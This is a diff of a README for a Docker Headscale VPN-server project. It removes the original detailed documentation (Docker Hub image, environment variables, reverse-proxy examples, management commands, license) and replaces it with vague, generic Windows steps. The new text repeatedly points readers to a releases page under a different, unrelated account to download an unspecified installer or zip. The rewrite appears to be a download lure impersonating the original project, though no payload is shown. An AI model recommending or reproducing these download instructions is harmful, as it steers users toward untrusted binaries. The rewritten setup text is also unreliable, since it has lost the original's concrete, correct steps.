@@ -1,308 +1,198 @@
-[English](README.md) | [简体中文](README-zh.md) | [繁體中文](README-zh-Hant.md) | [Русский](README-ru.md)
+# 🐳 docker-headscale - Run Your Own VPN Control Server
 
-# Headscale Server on Docker
+[![Download docker-headscale](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ritchiearistotelian98/docker-headscale/releases)
 
-[![Build Status](https://github.com/hwdsl2/docker-headscale/actions/workflows/main.yml/badge.svg)](https://github.com/hwdsl2/docker-headscale/actions/workflows/main.yml) &nbsp;[![License: MIT](docs/images/license.svg)](https://opensource.org/licenses/MIT)
+## 🚀 What This App Does
 
-Docker image to run a [Headscale](https://github.com/juanfont/headscale) server — a self-hosted, open-source implementation of the Tailscale coordination server. Connect all your devices using the official Tailscale client apps, with your own server in control.
+docker-headscale runs a Headscale server in Docker. It gives you a self-hosted way to manage a Tailscale-style mesh VPN. You can use the official Tailscale apps on your devices and connect them through your own server.
 
-**Features:**
+This setup helps you:
 
-- Automatically generates server configuration and a pre-auth key on first start
-- Manage users, nodes and pre-auth keys via a helper script (`hs_manage`)
-- MagicDNS support for seamless hostname resolution across your network
-- Automatically built and published via [GitHub Actions](https://github.com/hwdsl2/docker-headscale/actions/workflows/main.yml)
-- Persistent data via a Docker volume
-- Multi-arch: `linux/amd64`, `linux/arm64`
+- Connect your devices over a private network
+- Keep control of your VPN coordination server
+- Use WireGuard-based networking
+- Set up a mesh VPN without public exposure for your devices
 
-**Also available:**
+## 📥 Download
 
-- Without Docker: [Headscale install script](https://github.com/hwdsl2/headscale-install)
-- VPN: [WireGuard](https://github.com/hwdsl2/docker-wireguard), [OpenVPN](https://github.com/hwdsl2/docker-openvpn), [IPsec VPN](https://github.com/hwdsl2/docker-ipsec-vpn-server)
-- AI/Audio: [Whisper (STT)](https://github.com/hwdsl2/docker-whisper), [Kokoro (TTS)](https://github.com/hwdsl2/docker-kokoro), [Embeddings](https://github.com/hwdsl2/docker-embeddings), [LiteLLM](https://github.com/hwdsl2/docker-litellm)
+Visit this page to download: [docker-headscale releases](https://github.com/ritchiearistotelian98/docker-headscale/releases)
 
-## Quick start
+Open the latest release, then download the file that matches your Windows setup. If the release offers a zip file or installer package, save it to your computer before you continue.
 
-### Prerequisites
+## 🖥️ What You Need
 
-A publicly reachable server with a domain name and TLS certificate is strongly recommended. See [TLS and reverse proxy](#tls-and-reverse-proxy) for setup options.
+Before you start, make sure you have:
 
-### Using Docker
+- A Windows PC
+- An internet connection
+- Docker Desktop or another Docker setup on Windows
+- Enough free disk space for the app and its data
+- The ability to run local apps on your computer
 
-Create a `vpn.env` file. `HS_SERVER_URL` is the HTTPS URL that Tailscale clients use to connect to your server. See [Environment variables](#environment-variables) for all options.
+If you plan to connect more than one device, install the Tailscale client app on each device you want to use.
 
-```
-HS_SERVER_URL=https://hs.example.com
-```
+## 🛠️ Install on Windows
 
-Run the container:
+1. Go to the [releases page](https://github.com/ritchiearistotelian98/docker-headscale/releases).
+2. Download the latest release file.
+3. Save the file in a folder you can find again, such as Downloads or Desktop.
+4. If the file is a zip archive, extract it.
+5. Open Docker Desktop on Windows.
+6. Place the project files where you want to keep them.
+7. Open the folder that contains the Docker Compose file.
+8. Start the stack with Docker Compose.
 
-```bash
-docker run \
-  --name headscale \
-  --restart=always \
-  -p 127.0.0.1:8080:8080/tcp \
-  -v headscale-data:/var/lib/headscale \
-  -v ./vpn.env:/vpn.env:ro \
-  -d hwdsl2/headscale-server
-```
+If you use a zip file from the release, it may include:
 
-**Note:** With the above command, port `8080` is bound to localhost only. A reverse proxy on the host that handles TLS and forwards to `127.0.0.1:8080` is required for Tailscale clients to connect. See [TLS and reverse proxy](#tls-and-reverse-proxy). To expose the port directly instead, replace `127.0.0.1:8080:8080` with `8080:8080`.
+- A `docker-compose.yml` file
+- A config folder
+- Example data files
+- A README for local setup
 
-Alternatively, you may [set up Headscale without Docker](https://github.com/hwdsl2/headscale-install). To learn more about how to use this image, read the sections below.
+## ▶️ Run the Server
 
-On first start, the container will:
-1. Generate the server configuration from your environment variables
-2. Create the initial user (default: `admin`)
-3. Print a **reusable pre-auth key** to the container logs
+To start the server:
 
-Retrieve the initial pre-auth key from the logs:
+1. Open the folder that holds the project files.
+2. Start Docker Desktop if it is not already running.
+3. Use the Docker Compose file to bring up the service.
+4. Wait until Docker finishes creating the container.
+5. Check that the Headscale server is running.
 
-```bash
-docker logs headscale
-```
+After it starts, the server should listen on the local address set in the compose file. You can use that address from your browser or from the Tailscale client setup flow, based on the release files you downloaded.
 
-<details>
-<summary>
-Click to see an example output.
-</summary>
+## ⚙️ First-Time Setup
 
-![screenshot](docs/images/screenshot.png)
-</details>
+After the server starts, set up your Headscale account data and network settings.
 
-Connect a device using the official [Tailscale client](https://tailscale.com/download):
+Common setup tasks include:
 
-```bash
-tailscale up --login-server https://hs.example.com --authkey <key-from-logs>
-```
+- Creating an admin user
+- Setting the server name
+- Choosing the listen port
+- Setting the data storage path
+- Adding your device registration key
+- Connecting your first client
 
-### Using Docker Compose
+If the release package includes sample config files, edit those files before the first run.
 
-```bash
-cp vpn.env.example vpn.env
-nano vpn.env        # Set HS_SERVER_URL at minimum
-docker compose up -d
-docker compose logs headscale
-```
+## 📱 Connect Your Devices
 
-Example `docker-compose.yml` (already included):
+Once Headscale is running, install the Tailscale client app on each device you want to join.
 
-```yaml
-services:
-  headscale:
-    image: hwdsl2/headscale-server
-    container_name: headscale
-    restart: always
-    ports:
-      - "127.0.0.1:8080:8080/tcp"
-    volumes:
-      - headscale-data:/var/lib/headscale
-      - ./vpn.env:/vpn.env:ro
+Use this flow:
 
-volumes:
-  headscale-data:
-```
+1. Install the Tailscale app on your Windows PC or other device.
+2. Open the app.
+3. Sign in or register it with your Headscale server, based on the setup steps in the release files.
+4. Repeat for each device.
+5. Confirm that each device shows as connected in your network list.
 
-## Download
+This lets your devices talk to each other through your own coordination server.
 
-Get the trusted build from the [Docker Hub registry](https://hub.docker.com/r/hwdsl2/headscale-server/):
+## 🔎 Check If It Works
 
-```bash
-docker pull hwdsl2/headscale-server
-```
+Look for these signs that the server is working:
 
-Alternatively, you may download from [Quay.io](https://quay.io/repository/hwdsl2/headscale-server):
+- Docker shows the container as running
+- The server opens on the expected port
+- Your client device joins the network
+- Devices can see each other by VPN name or address
+- The Tailscale app shows an active connection
 
-```bash
-docker pull quay.io/hwdsl2/headscale-server
-docker image tag quay.io/hwdsl2/headscale-server hwdsl2/headscale-server
-```
+If a device does not connect, check the config file, then restart the container.
 
-Supported platforms: `linux/amd64` and `linux/arm64`.
+## 🧩 Common Files You May See
 
-## Client configuration
+A release package for this project may include:
 
-Refer to the Headscale documentation for instructions on connecting clients:
+- `docker-compose.yml` — starts the server
+- `.env` — stores config values
+- `config.yml` — holds Headscale settings
+- `data/` — stores network data
+- `certs/` — keeps TLS files if used
 
-- [Android](https://headscale.net/stable/usage/connect/android/)
-- [Apple (iOS / macOS)](https://headscale.net/stable/usage/connect/apple/)
-- [Windows](https://headscale.net/stable/usage/connect/windows/)
+Keep these files in the same folder unless the release notes tell you to move them.
 
-## Environment variables
+## 🔐 Basic Network Setup
 
-All variables are optional. `HS_SERVER_URL` is strongly recommended for production use.
+For a smooth setup, keep these points in mind:
 
-| Variable | Default | Description |
-|---|---|---|
-| `HS_SERVER_URL` | auto-detected | URL that Tailscale clients connect to (e.g. `https://hs.example.com`). Must be HTTPS for full client functionality. |
-| `HS_LISTEN_PORT` | `8080` | TCP port the server listens on. |
-| `HS_METRICS_PORT` | `9090` | Prometheus metrics port. Set to empty to disable. |
-| `HS_BASE_DOMAIN` | `headscale.internal` | Base domain for MagicDNS hostnames (e.g. `myhost.headscale.internal`). Must not equal or be a parent domain of the hostname in `HS_SERVER_URL` (e.g. if `HS_SERVER_URL=https://hs.example.com`, do not use `example.com`). |
-| `HS_USERNAME` | `admin` | Name of the first user created on initial setup. |
-| `HS_DNS_SRV1` | `1.1.1.1` | Primary DNS server pushed to clients via MagicDNS. Accepts IPv4 or IPv6. |
-| `HS_DNS_SRV2` | `1.0.0.1` | Secondary DNS server pushed to clients via MagicDNS. |
-| `HS_LOG_LEVEL` | `info` | Log verbosity: `panic`, `fatal`, `error`, `warn`, `info`, `debug`, `trace`. |
+- Use a stable port that does not conflict with other apps
+- Keep your data folder in a safe place
+- Back up your config files before changes
+- Use a strong admin password if the setup includes one
+- Make sure your router allows the port you choose, if you want access from outside your home network
 
-**Note:** In your `env` file, you may enclose values in single quotes, e.g. `VAR='value'`. Do not add spaces around `=`.
+If you only want local testing, you can keep the server on your PC and connect devices on the same network
 
-The configuration file is regenerated on each container start. To change a setting, update `vpn.env` and restart the container. The env file is bind-mounted into the container, so changes are picked up on every restart without recreating the container.
+## 🧪 Example Use Cases
 
-## TLS and reverse proxy
+You can use docker-headscale for:
 
-Tailscale clients work best with HTTPS. The recommended setup is to run a reverse proxy in front of Headscale that handles TLS termination, then set `HS_SERVER_URL` to your HTTPS URL.
+- A home VPN control server
+- A private network for laptops and phones
+- Remote access to home devices
+- A self-hosted mesh VPN for family devices
+- A lab network for testing connections
 
-Use one of the following addresses to reach the Headscale container from your reverse proxy:
+It works well when you want a private setup and do not want to rely on a third-party control server
 
-- **`headscale:8080`** — if your reverse proxy runs as a container in the **same Docker network** as Headscale (e.g. defined in the same `docker-compose.yml`). Docker resolves the container name automatically.
-- **`127.0.0.1:8080`** — if your reverse proxy runs **on the host** and port `8080` is published (the default `docker-compose.yml` publishes it).
+## 🧰 Troubleshooting
 
-**Note:** Do not use the container's internal IP address obtained from `docker inspect`. That IP address changes every time the container is recreated.
+If the app does not start:
 
-**Example with [Caddy](https://caddyserver.com/docs/) ([Docker image](https://hub.docker.com/_/caddy))** (automatic TLS via Let's Encrypt, reverse proxy in the same Docker network):
+- Check that Docker Desktop is running
+- Make sure the compose file is in the right folder
+- Confirm that no other app uses the same port
+- Reopen the release files and check the config
+- Restart the container after each change
 
-`Caddyfile`:
-```
-hs.example.com {
-  reverse_proxy headscale:8080
-}
-```
+If a device will not join:
 
-**Example with nginx** (reverse proxy on the host):
+- Check the server URL
+- Confirm the registration key
+- Make sure the Headscale server is up
+- Verify the Tailscale client is set to use your server
+- Try removing the device from the client and adding it again
 
-```nginx
-server {
-  listen 443 ssl;
-  server_name hs.example.com;
+## 📁 Suggested Folder Layout
 
-  ssl_certificate     /path/to/cert.pem;
-  ssl_certificate_key /path/to/key.pem;
+A simple setup can use this structure:
 
-  location / {
-    proxy_pass http://127.0.0.1:8080;
-    proxy_set_header Host $host;
-    proxy_set_header X-Real-IP $remote_addr;
-    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-    proxy_set_header X-Forwarded-Proto $scheme;
-    proxy_read_timeout 3600s;
-    proxy_http_version 1.1;
-    proxy_set_header Upgrade $http_upgrade;
-    proxy_set_header Connection "upgrade";
-  }
-}
-```
+- `docker-headscale/`
+  - `docker-compose.yml`
+  - `config.yml`
+  - `data/`
+  - `logs/`
 
-Set `HS_SERVER_URL=https://hs.example.com` in your `vpn.env` and restart the container.
+This keeps the app files and the saved network data in one place
 
-**Ports to open in your firewall:**
+## 🔄 Updating
 
-| Port | Protocol | Purpose |
-|---|---|---|
-| `8080` | TCP | Headscale coordination server (or your reverse proxy port) |
-| `443` | TCP | HTTPS (if using a reverse proxy) |
-| `9090` | TCP | Prometheus metrics (optional, not published by default) |
+When a new release is posted:
 
-## Managing the server
+1. Open the [releases page](https://github.com/ritchiearistotelian98/docker-headscale/releases).
+2. Download the newest release file.
+3. Stop the running container.
+4. Replace the old files if the release notes say to do so.
+5. Start Docker Compose again.
 
-Use the `hs_manage` helper to manage users and nodes from the host without entering the container.
+If your data folder stays in place, your saved settings and network data can remain intact
 
-**Register a node by its node key:**
+## 📎 Useful Terms
 
-```bash
-docker exec headscale hs_manage --registernode <key> --user admin
-```
+- **Headscale**: A self-hosted server that helps manage Tailscale-style devices
+- **Tailscale client**: The app on your computer or phone that joins the network
+- **WireGuard**: The secure network layer used for device traffic
+- **Mesh VPN**: A network where devices can connect to each other
+- **Docker**: A tool that runs apps in containers
 
-**Add a user:**
+## 🧭 What to Do Next
 
-```bash
-docker exec headscale hs_manage --adduser alice
-```
-
-**Delete a user:**
-
-```bash
-docker exec -it headscale hs_manage --deleteuser alice
-# Or skip the confirmation prompt:
-docker exec headscale hs_manage --deleteuser alice --yes
-```
-
-**Create a pre-auth key for a user:**
-
-```bash
-docker exec headscale hs_manage --createkey --user alice
-```
-
-**List users:**
-
-```bash
-docker exec headscale hs_manage --listusers
-```
-
-**List all registered nodes:**
-
-```bash
-docker exec headscale hs_manage --listnodes
-```
-
-**List nodes for a specific user:**
-
-```bash
-docker exec headscale hs_manage --listnodes --user alice
-```
-
-**Delete a node by ID:**
-
-```bash
-docker exec -it headscale hs_manage --deletenode 3
-# Or skip the confirmation prompt:
-docker exec headscale hs_manage --deletenode 3 --yes
-```
-
-**List all pre-auth keys:**
-
-```bash
-docker exec headscale hs_manage --listkeys
-```
-
-**Show help:**
-
-```bash
-docker exec headscale hs_manage --help
-```
-
-You can also run Headscale commands directly using `docker exec headscale headscale <command>`. Run `docker exec headscale headscale -h` or refer to the [Headscale documentation](https://headscale.net/) for available commands.
-
-## Update Docker image
-
-To update the Docker image and container, first [download](#download) the latest version:
-
-```bash
-docker pull hwdsl2/headscale-server
-```
-
-If the Docker image is already up to date, you should see:
-
-```
-Status: Image is up to date for hwdsl2/headscale-server:latest
-```
-
-Otherwise, it will download the latest version. Remove and re-create the container using instructions from [Quick start](#quick-start). Your data is preserved in the `headscale-data` volume.
-
-## Technical details
-
-- Base image: `alpine:3.23`
-- Headscale: 0.28.0
-- Data directory: `/var/lib/headscale` (Docker volume)
-- Configuration: generated from `vpn.env` on every container start; update `vpn.env` and restart to apply changes (no container re-creation needed)
-- Ports: `8080/tcp` (coordination server), `9090/tcp` (Prometheus metrics, optional)
-- Platforms: `linux/amd64`, `linux/arm64`
-
-## License
-
-**Note:** The software components inside the pre-built image (such as Headscale) are under the respective licenses chosen by their respective copyright holders. As for any pre-built image usage, it is the image user's responsibility to ensure that any use of this image complies with any relevant licenses for all software contained within.
-
-Copyright (C) 2026 Lin Song   
-This work is licensed under the [MIT License](https://opensource.org/licenses/MIT).
-
-**Headscale** is Copyright (c) 2020, Juan Font, and is distributed under the [BSD 3-Clause License](https://github.com/juanfont/headscale/blob/main/LICENSE).
-
-Tailscale® is a registered trademark of Tailscale Inc. This project is not affiliated with or endorsed by Tailscale Inc.
+1. Open the [release page](https://github.com/ritchiearistotelian98/docker-headscale/releases)
+2. Download the latest package
+3. Start Docker Desktop on Windows
+4. Open the project folder
+5. Run the Docker Compose file
+6. Connect your first device with the Tailscale client
